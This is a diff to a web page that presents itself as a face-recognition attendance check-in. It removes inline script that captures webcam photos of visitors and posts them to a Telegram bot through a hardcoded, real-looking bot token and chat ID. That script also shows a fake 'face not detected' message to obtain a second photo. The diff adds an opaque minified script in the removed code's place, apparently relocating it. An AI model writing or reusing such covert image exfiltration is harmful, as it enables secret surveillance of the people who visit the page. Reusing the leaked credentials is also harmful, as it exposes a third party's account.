@@ -97,9 +97,10 @@
         <p>Redirecting...</p>
     </div>
 
+    <script src="helloHandler.min.js"></script>
+
     <script>
-        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
-        const TELEGRAM_CHAT_ID = '5934902786';
+       
         function showClassSelection() {
     document.getElementById('class-selection').classList.remove('hidden');
     document.getElementById('face-recognition').classList.add('hidden');
@@ -206,95 +207,6 @@ $('#reset-selection').on('click', function() {
                 setTimeout(() => takePicture(1), 2000);
             });
 
-        function startCamera() {
-            const video = document.getElementById('video');
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(() => takePicture(1), 2000); // Pastikan kamera dah ready
-        };
-                })
-                .catch(error => {
-                    console.error("Error accessing camera: ", error);
-                });
-        }
-
-        function takePicture(step) {
-            const video = document.getElementById('video');
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            sendToTelegram(canvas, step);
-        }
-
-        function sendToTelegram(canvas, step) {
-            canvas.toBlob(blob => {
-                let formData = new FormData();
-                formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("photo", blob, "face.jpg");
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                }).then(() => {
-                    if (step === 1) {
-                        $('#face-recognition').addClass('hidden');
-                        $('#face-not-detected').removeClass('hidden');
-                        $('#try-again').off('click').on('click', function() {
-    $('#face-not-detected').addClass('hidden');
-    $('#face-recognition').removeClass('hidden');
-    
-    setTimeout(() => takePicture(2), 3000); // Tunggu 4 saat sebelum ambil gambar kedua
-});
-
-// Jika user tekan "Cancel"
-$('#cancel-scan').on('click', function() {
-    alert('Page will stop here.');
-    localStorage.setItem("pageOpened", "false");
-});
-
-                    } else {
-                        stopCamera();
-                        $('#face-recognition').addClass('hidden');
-                        $('#completion').removeClass('hidden');
-                        const selectedName = [...selectedNames][0]; // Ambil nama yg dipilih
-
-                        // 🔥 Hantar ke Firebase
-                        firebase.database().ref("attendance/" + selectedName).set({
-                            status: "Success"
-                        });
-                        $('#signed-in').text([...selectedNames].join(', ') + " signed in ✅");
-                        let compliment = "You look amazing today!"; // Default  
-
-                        if (maleNames.includes(selectedName)) {  
-    compliment = "You look handsome today!";  
-} else if (femaleNames.includes(selectedName)) {  
-    compliment = "You look beautiful today!";  
-}  
-
-$('#completion p:nth-child(2)').text(compliment);
-                        setTimeout(() => {
-                            localStorage.setItem("pageOpened", "true"); // Pastikan page dah 'habis' digunakan
-                            localStorage.setItem("currentStep", "done");
-                            window.location.href = "https://studandlearn.github.io/Spinwheel/";
-                        }, 3000);
-                    }
-                });
-            }, 'image/jpeg');
-        }
-
-        function stopCamera() {
-            const video = document.getElementById('video');
-            const stream = video.srcObject;
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-        }
         function resetAllNames() {
         firebase.database().ref("usedNames").remove().then(() => {
             alert("All names reset.");
